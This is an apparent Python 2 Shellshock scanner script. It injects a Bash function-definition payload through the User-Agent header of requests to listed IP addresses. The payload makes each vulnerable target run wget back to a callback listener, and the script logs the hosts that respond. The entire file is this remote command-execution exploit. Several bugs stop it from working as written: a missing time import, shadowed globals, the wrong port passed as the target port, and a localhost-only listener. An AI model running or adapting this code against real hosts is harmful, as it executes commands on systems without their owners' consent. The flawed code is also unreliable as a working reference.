
import SocketServer
import SimpleHTTPServer
import threading
import getopt
import sys
import urllib2
import hashlib
import socket

local_ip = socket.gethostbyname(socket.gethostname())

local_port = 80
output_file = ""
ids = {}


def record_scan_response():
	""" sample function to be called via a URL"""
	return 'ShellShock Returned'
	
class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	def do_GET(self):
        #Sample values in self for URL: http://localhost:8080/jsxmlrpc-0.3/
        #self.path  '/jsxmlrpc-0.3/'
        #self.raw_requestline   'GET /jsxmlrpc-0.3/ HTTP/1.1rn'
        #self.client_address    ('127.0.0.1', 3727)
		
		print self.path[1::]
		print "%s Responded" % ids[self.path[1::]] 
		output_file.write("%s: Responded\n" % ids[self.path[1::]])
		
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(record_scan_response()) #call sample function here
		return

def test_ip(ip_address, target_port, identifier, ssl):
	#Send a Bash/CGI Injection with the unique identifier.
	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s'>>/dev/null" %(local_ip,str(local_port),identifier)
	print user_agent_str
	opener = urllib2.build_opener()
	opener.addheaders = [('User-agent', user_agent_str)]
	try:
		if not ssl:
			response = opener.open("http://%s:%s/%s"%(ip_address,target_port,identifier))
		else:
			response = opener.open("https://%s:%s/%s"%(ip_address,target_port,identifier))
	except:
		print "Unable to connect, moving on"
	return

def create_ip_scan_table(ips):
	#Generate a map of IPs and unique identifiers.
	salt = "ShellShockSalt"
	hash_table = {}
	for ip in ips:
		m = hashlib.md5()
		m.update(str(ip)+salt)
		hash_table[m.hexdigest()]=ip
	return hash_table
		
def usage():
	print "shellshock_scanner.py"
	print "Options:"
	print "-i <inputfile>"
	print "-o <outputfile>"
		
def main():
	#read IP Addresses to Scan
	input_filename = ""
	output_filename = ""
	attack_ports = [80,443]
	try:
		opts, args = getopt.getopt(sys.argv[1:],"i:p:o:")
	except getopt.GetoptError as err:
		print str(err)
		usage()
		sys.exit()

	#Get all our opts in place.
	for o, a in opts:
		if o == "-h":
			usage()
			return
		elif o == "-i":
			input_filename = a
		elif o == "-o":
			output_filename = a
	
	if input_filename == "" or output_filename == "":
		usage()
		return
	
	input_file = open(input_filename,"r")
	output_file = open(output_filename,"w")
	ips = input_file.readlines()
	ids = create_ip_scan_table(ips);
	print ids
	print ""
	t1_stop=threading.Event()
	httpd = SocketServer.ThreadingTCPServer(('localhost', local_port),CustomHandler)
	server = threading.Thread(target=httpd.serve_forever);
	server.daemon=True
	server.start();
	print "ShellShock Scan Listener started on %s:%s" % (local_ip,local_port)

	
	for id in ids.keys():
		test_ip(ids[id],str(local_port),id,False)
	
	print("Finished list, waiting 15 more seconds")
	time.sleep(15);
	print("Shutting down server")
	httpd.shutdown

main()
